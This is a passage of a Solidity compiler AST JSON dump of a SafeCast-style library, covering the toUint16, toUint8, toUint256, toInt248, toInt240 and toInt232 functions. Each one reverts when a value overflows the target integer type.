16"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4540,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"16421:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4543,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"16421:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4544,"nodeType":"RevertStatement","src":"16414:48:7"}]}},{"expression":{"arguments":[{"id":4549,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4528,"src":"16496:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4548,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"16489:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint16_$","typeString":"type(uint16)"},"typeName":{"id":4547,"name":"uint16","nodeType":"ElementaryTypeName","src":"16489:6:7","typeDescriptions":{}}},"id":4550,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"16489:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint16","typeString":"uint16"}},"functionReturnParameters":4532,"id":4551,"nodeType":"Return","src":"16482:20:7"}]},"documentation":{"id":4526,"nodeType":"StructuredDocumentation","src":"16015:276:7","text":" @dev Returns the downcasted uint16 from uint256, reverting on\n overflow (when the input is greater than largest uint16).\n Counterpart to Solidity's `uint16` operator.\n Requirements:\n - input must fit into 16 bits"},"id":4553,"implemented":true,"kind":"function","modifiers":[],"name":"toUint16","nameLocation":"16305:8:7","nodeType":"FunctionDefinition","parameters":{"id":4529,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4528,"mutability":"mutable","name":"value","nameLocation":"16322:5:7","nodeType":"VariableDeclaration","scope":4553,"src":"16314:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4527,"name":"uint256","nodeType":"ElementaryTypeName","src":"16314:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"16313:15:7"},"returnParameters":{"id":4532,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4531,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4553,"src":"16352:6:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint16","typeString":"uint16"},"typeName":{"id":4530,"name":"uint16","nodeType":"ElementaryTypeName","src":"16352:6:7","typeDescriptions":{"typeIdentifier":"t_uint16","typeString":"uint16"}},"visibility":"internal"}],"src":"16351:8:7"},"scope":5451,"src":"16296:213:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4580,"nodeType":"Block","src":"16854:146:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4567,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4561,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4556,"src":"16868:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4564,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"16881:5:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint8_$","typeString":"type(uint8)"},"typeName":{"id":4563,"name":"uint8","nodeType":"ElementaryTypeName","src":"16881:5:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint8_$","typeString":"type(uint8)"}],"id":4562,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"16876:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":4565,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"16876:11:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint8","typeString":"type(uint8)"}},"id":4566,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"16888:3:7","memberName":"max","nodeType":"MemberAccess","src":"16876:15:7","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"src":"16868:23:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4574,"nodeType":"IfStatement","src":"16864:101:7","trueBody":{"id":4573,"nodeType":"Block","src":"16893:72:7","statements":[{"errorCall":{"arguments":[{"hexValue":"38","id":4569,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"16945:1:7","typeDescriptions":{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},"value":"8"},{"id":4570,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4556,"src":"16948:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4568,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"16914:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4571,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"16914:40:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4572,"nodeType":"RevertStatement","src":"16907:47:7"}]}},{"expression":{"arguments":[{"id":4577,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4556,"src":"16987:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4576,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"16981:5:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint8_$","typeString":"type(uint8)"},"typeName":{"id":4575,"name":"uint8","nodeType":"ElementaryTypeName","src":"16981:5:7","typeDescriptions":{}}},"id":4578,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"16981:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"functionReturnParameters":4560,"id":4579,"nodeType":"Return","src":"16974:19:7"}]},"documentation":{"id":4554,"nodeType":"StructuredDocumentation","src":"16515:272:7","text":" @dev Returns the downcasted uint8 from uint256, reverting on\n overflow (when the input is greater than largest uint8).\n Counterpart to Solidity's `uint8` operator.\n Requirements:\n - input must fit into 8 bits"},"id":4581,"implemented":true,"kind":"function","modifiers":[],"name":"toUint8","nameLocation":"16801:7:7","nodeType":"FunctionDefinition","parameters":{"id":4557,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4556,"mutability":"mutable","name":"value","nameLocation":"16817:5:7","nodeType":"VariableDeclaration","scope":4581,"src":"16809:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4555,"name":"uint256","nodeType":"ElementaryTypeName","src":"16809:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"16808:15:7"},"returnParameters":{"id":4560,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4559,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4581,"src":"16847:5:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"},"typeName":{"id":4558,"name":"uint8","nodeType":"ElementaryTypeName","src":"16847:5:7","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"visibility":"internal"}],"src":"16846:7:7"},"scope":5451,"src":"16792:208:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4603,"nodeType":"Block","src":"17236:128:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":4591,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4589,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4584,"src":"17250:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"hexValue":"30","id":4590,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"17258:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"17250:9:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4597,"nodeType":"IfStatement","src":"17246:81:7","trueBody":{"id":4596,"nodeType":"Block","src":"17261:66:7","statements":[{"errorCall":{"arguments":[{"id":4593,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4584,"src":"17310:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4592,"name":"SafeCastOverflowedIntToUint","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3701,"src":"17282:27:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_int256_$returns$_t_error_$","typeString":"function (int256) pure returns (error)"}},"id":4594,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"17282:34:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4595,"nodeType":"RevertStatement","src":"17275:41:7"}]}},{"expression":{"arguments":[{"id":4600,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4584,"src":"17351:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4599,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"17343:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"},"typeName":{"id":4598,"name":"uint256","nodeType":"ElementaryTypeName","src":"17343:7:7","typeDescriptions":{}}},"id":4601,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"17343:14:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":4588,"id":4602,"nodeType":"Return","src":"17336:21:7"}]},"documentation":{"id":4582,"nodeType":"StructuredDocumentation","src":"17006:160:7","text":" @dev Converts a signed int256 into an unsigned uint256.\n Requirements:\n - input must be greater than or equal to 0."},"id":4604,"implemented":true,"kind":"function","modifiers":[],"name":"toUint256","nameLocation":"17180:9:7","nodeType":"FunctionDefinition","parameters":{"id":4585,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4584,"mutability":"mutable","name":"value","nameLocation":"17197:5:7","nodeType":"VariableDeclaration","scope":4604,"src":"17190:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":4583,"name":"int256","nodeType":"ElementaryTypeName","src":"17190:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"17189:14:7"},"returnParameters":{"id":4588,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4587,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4604,"src":"17227:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4586,"name":"uint256","nodeType":"ElementaryTypeName","src":"17227:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"17226:9:7"},"scope":5451,"src":"17171:193:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4629,"nodeType":"Block","src":"17761:150:7","statements":[{"expression":{"id":4617,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":4612,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4610,"src":"17771:10:7","typeDescriptions":{"typeIdentifier":"t_int248","typeString":"int248"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":4615,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4607,"src":"17791:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4614,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"17784:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int248_$","typeString":"type(int248)"},"typeName":{"id":4613,"name":"int248","nodeType":"ElementaryTypeName","src":"17784:6:7","typeDescriptions":{}}},"id":4616,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"17784:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int248","typeString":"int248"}},"src":"17771:26:7","typeDescriptions":{"typeIdentifier":"t_int248","typeString":"int248"}},"id":4618,"nodeType":"ExpressionStatement","src":"17771:26:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":4621,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4619,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4610,"src":"17811:10:7","typeDescriptions":{"typeIdentifier":"t_int248","typeString":"int248"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":4620,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4607,"src":"17825:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"17811:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4628,"nodeType":"IfStatement","src":"17807:98:7","trueBody":{"id":4627,"nodeType":"Block","src":"17832:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"323438","id":4623,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"17883:3:7","typeDescriptions":{"typeIdentifier":"t_rational_248_by_1","typeString":"int_const 248"},"value":"248"},{"id":4624,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4607,"src":"17888:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_248_by_1","typeString":"int_const 248"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4622,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"17853:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":4625,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"17853:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4626,"nodeType":"RevertStatement","src":"17846:48:7"}]}}]},"documentation":{"id":4605,"nodeType":"StructuredDocumentation","src":"17370:312:7","text":" @dev Returns the downcasted int248 from int256, reverting on\n overflow (when the input is less than smallest int248 or\n greater than largest int248).\n Counterpart to Solidity's `int248` operator.\n Requirements:\n - input must fit into 248 bits"},"id":4630,"implemented":true,"kind":"function","modifiers":[],"name":"toInt248","nameLocation":"17696:8:7","nodeType":"FunctionDefinition","parameters":{"id":4608,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4607,"mutability":"mutable","name":"value","nameLocation":"17712:5:7","nodeType":"VariableDeclaration","scope":4630,"src":"17705:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":4606,"name":"int256","nodeType":"ElementaryTypeName","src":"17705:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"17704:14:7"},"returnParameters":{"id":4611,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4610,"mutability":"mutable","name":"downcasted","nameLocation":"17749:10:7","nodeType":"VariableDeclaration","scope":4630,"src":"17742:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int248","typeString":"int248"},"typeName":{"id":4609,"name":"int248","nodeType":"ElementaryTypeName","src":"17742:6:7","typeDescriptions":{"typeIdentifier":"t_int248","typeString":"int248"}},"visibility":"internal"}],"src":"17741:19:7"},"scope":5451,"src":"17687:224:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4655,"nodeType":"Block","src":"18308:150:7","statements":[{"expression":{"id":4643,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":4638,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4636,"src":"18318:10:7","typeDescriptions":{"typeIdentifier":"t_int240","typeString":"int240"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":4641,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4633,"src":"18338:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4640,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"18331:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int240_$","typeString":"type(int240)"},"typeName":{"id":4639,"name":"int240","nodeType":"ElementaryTypeName","src":"18331:6:7","typeDescriptions":{}}},"id":4642,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"18331:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int240","typeString":"int240"}},"src":"18318:26:7","typeDescriptions":{"typeIdentifier":"t_int240","typeString":"int240"}},"id":4644,"nodeType":"ExpressionStatement","src":"18318:26:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":4647,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4645,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4636,"src":"18358:10:7","typeDescriptions":{"typeIdentifier":"t_int240","typeString":"int240"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":4646,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4633,"src":"18372:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"18358:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4654,"nodeType":"IfStatement","src":"18354:98:7","trueBody":{"id":4653,"nodeType":"Block","src":"18379:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"323430","id":4649,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"18430:3:7","typeDescriptions":{"typeIdentifier":"t_rational_240_by_1","typeString":"int_const 240"},"value":"240"},{"id":4650,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4633,"src":"18435:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_240_by_1","typeString":"int_const 240"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4648,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"18400:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":4651,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"18400:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4652,"nodeType":"RevertStatement","src":"18393:48:7"}]}}]},"documentation":{"id":4631,"nodeType":"StructuredDocumentation","src":"17917:312:7","text":" @dev Returns the downcasted int240 from int256, reverting on\n overflow (when the input is less than smallest int240 or\n greater than largest int240).\n Counterpart to Solidity's `int240` operator.\n Requirements:\n - input must fit into 240 bits"},"id":4656,"implemented":true,"kind":"function","modifiers":[],"name":"toInt240","nameLocation":"18243:8:7","nodeType":"FunctionDefinition","parameters":{"id":4634,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4633,"mutability":"mutable","name":"value","nameLocation":"18259:5:7","nodeType":"VariableDeclaration","scope":4656,"src":"18252:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":4632,"name":"int256","nodeType":"ElementaryTypeName","src":"18252:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"18251:14:7"},"returnParameters":{"id":4637,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4636,"mutability":"mutable","name":"downcasted","nameLocation":"18296:10:7","nodeType":"VariableDeclaration","scope":4656,"src":"18289:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int240","typeString":"int240"},"typeName":{"id":4635,"name":"int240","nodeType":"ElementaryTypeName","src":"18289:6:7","typeDescriptions":{"typeIdentifier":"t_int240","typeString":"int240"}},"visibility":"internal"}],"src":"18288:19:7"},"scope":5451,"src":"18234:224:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4681,"nodeType":"Block","src":"18855:150:7","statements":[{"expression":{"id":4669,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":4664,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4662,"src":"18865:10:7","typeDescriptions":{"typeIdentifier":"t_int232","typeString":"int232"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":4667,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4659,"src":"18885:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4666,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"18878:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int232_$","typeString":"type(int232)"},"typeName":{"id":4665,"name":"int232","nodeType":"ElementaryTypeName","src":"18878:6:7","typeDescriptions":{}}},"id":4668,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"18878:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int232","typeString":"int232"}},"src":"18865:26:7","typeDescriptions":{"typeIdentifier":"t_int232","typeString":"int232"}},"id":4670,"nodeType":"ExpressionStatement","src":"18865:26:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":4673,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4671,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4662,"src":"18905:10:7","typeDescriptions":{"typeIdentifier":"t_int232","typeString":"int232"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":4672,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4659,"src":"18919:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"18905:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4680,"nodeType":"IfStatement","src":"18901:98:7","trueBody":{"id":4679,"nodeType":"Block","src":"18926:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"323332","id":4675,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"18977:3:7","typeDescriptions":{"typeIdentifier":"t_rational_232_by_1","typeString":"int_const 232"},"value":"232"},{"id":4676,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4659,"src":"18982:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_232_by_1","typeString":"int_const 232"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4674,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"18947:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":4677,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"18947:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4678,"nodeType":"RevertStatement","src":"18940:48:7"}]}}]},"documentation":{"id":4657,"nodeType":"StructuredDocumentation","src":"18464:312:7","text":" @dev Returns the downcasted int232 from int256, reverting on\n overflow (when the input is less than smallest int232 or\n greater than largest int232).\n Counterpart to Solidity's `int232` operator.\n Requirements:\n - input must fit into 232 bits"},"id":4682,"implemented":true,"kind":"function","modifiers":[],"name":"toInt232","nameLocation":"18790:8:7","nodeType":"FunctionDefinition","parameters":{"id":4660,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4659,"mutability":"mutable","name":"value","nameLocation":"18806:5:7","nodeType":"VariableDeclaration","scope":4682,"src":"18799:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":4658,"name":"int256","nodeType":"ElementaryTypeName","src":"18799:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"18798:14:7"},"returnParameters":{"id":4663,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4662,"mutability":"mutable","name":"downcasted","nameLocation":"18843:10:7","nodeType":"VariableDeclaration","scope":4682,"src":"18836:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int232","typeString":"int232"},"typeName":{"id":4661,"name":"int232","nodeType":"ElementaryTypeName","src":"18836:6:7","typeDescriptions":{"typeIdentifier":"t_int232","typeString":"int232"}},"visibility":"internal"}],"src":"18835:19:7"},"scope":5451,"src":"18781:224:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4707,"nodeType":"Block","src":"19402:150:7","statements":[{"expression":{"id":4695,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":4690,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4688,"src":"19412:10:7","typeDescriptions":{"typeIdentifier":"t_int224","typeString":"int224"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":4693,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4685,"src":"19432:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4692,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"19425:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int224_$","typeString":"type(int224)"},"typeName":{"id":4691,"name":"int224","nodeType":"ElementaryTypeName","src":"19425:6:7","typeDescriptions":{}}},"id":4694,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"19425:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int224","typeString":"int224"}},"src":"19412:26:7","typeDescriptions":{"typeIdentifier":"t_int224","typeString":"int224"}},"id":4696,"nodeType":"ExpressionStatement","src":"19412:26:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":4699,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4697,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"